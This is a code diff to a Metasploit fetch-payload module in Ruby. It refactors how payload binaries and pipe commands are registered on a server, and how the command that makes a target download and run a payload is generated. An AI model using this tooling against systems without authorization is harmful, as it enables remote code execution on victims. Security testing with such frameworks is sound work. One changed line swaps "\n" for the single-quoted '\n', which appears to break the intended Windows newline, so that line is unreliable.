@@ -90,21 +90,26 @@ module Msf
       Rex::Socket.to_authority(fetch_bindhost, fetch_bindport)
     end
 
+    def add_srv_entry(uri, data, arch = ARCH_CMD)
+      srv_entry = {
+        :arch => arch,
+        :uri => uri,
+        :data => data
+      }
+      @srv_resources << srv_entry
+    end
+
     def generate(opts = {})
       opts[:arch] ||= module_info['AdaptedArch']
       if opts[:arch] == ARCH_ANY && module_info['AdaptedPlatform'] == 'linux'
         # create a hash with all the arches and payloads
         multi_arches.each do |arch|
           opts[:arch] = arch
-          @multi_arch = arch
+          @multi_arch = arch # needed for payload_uuid creation
           vprint_status("Generating payload for #{arch}")
           opts[:code] = super(opts)
           # no FETCH_URIPATH support for multi payloads
-          srv_entry = {}
-          srv_entry[:arch] = arch
-          srv_entry[:uri] = default_srvuri(arch.to_s)
-          srv_entry[:payload] = generate_payload_exe(opts)
-          @srv_resources << srv_entry
+          add_srv_entry(default_srvuri(arch.to_s), generate_payload_exe(opts), arch)
         end
         cmd = _generate_multi_commands(@srv_resources)
         # print_status("multi command:\n#{cmd}")
@@ -112,30 +117,24 @@ module Msf
           unless pipe_supported_binaries.include?(datastore['FETCH_COMMAND'].upcase)
             fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be one of #{pipe_supported_binaries}.")
           end
-          srv_entry = {}
-          srv_entry[:arch] = ARCH_CMD
-          srv_entry[:uri] = pipe_srvuri
-          srv_entry[:payload] = cmd
-          @srv_resources << srv_entry
+          add_srv_entry(pipe_srvuri, cmd)
           cmd = generate_pipe_command(pipe_srvuri)
           print_status("Pipe command: #{cmd}")
         end
       else
-        opts[:arch] ||= module_info['AdaptedArch']
         opts[:code] = super
-        @srv_resources[srvuri] = generate_payload_exe(opts)
+        add_srv_entry(srvuri, generate_payload_exe(opts), opts[:arch])
+        cmd = generate_fetch_commands(srvuri)
         if datastore['FETCH_PIPE']
           unless pipe_supported_binaries.include?(datastore['FETCH_COMMAND'].upcase)
             fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be one of #{pipe_supported_binaries}.")
           end
-          pipe_cmd = generate_fetch_commands(srvuri)
-          pipe_cmd << "\n" if windows? # need CR when we pipe command in Windows
-          vprint_status("Command served: #{pipe_cmd}")
+          cmd << '\n' if windows? # Needs CR for Windows command
+          add_srv_entry(pipe_srvuri, cmd)
           cmd = generate_pipe_command(pipe_srvuri)
-        else
-          cmd = generate_fetch_commands(srvuri)
         end
       end
+      vprint_status("Command to execute on target: #{cmd}")
       cmd
     end
 
